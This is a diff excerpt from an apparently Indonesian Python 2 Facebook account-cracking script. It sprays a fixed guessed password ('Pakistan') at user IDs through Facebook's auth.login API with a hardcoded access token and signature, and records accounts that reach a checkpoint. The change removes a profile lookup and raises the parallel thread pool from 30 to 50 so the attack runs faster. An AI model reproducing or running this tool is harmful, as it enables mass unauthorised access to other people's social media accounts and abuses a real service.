@@ -398,8 +398,6 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
                                                                                                                 else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
 															pass7 = 'Pakistan'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
@@ -449,7 +447,7 @@ def pilih_super():
 		except:																		
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id) 
 	
 	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
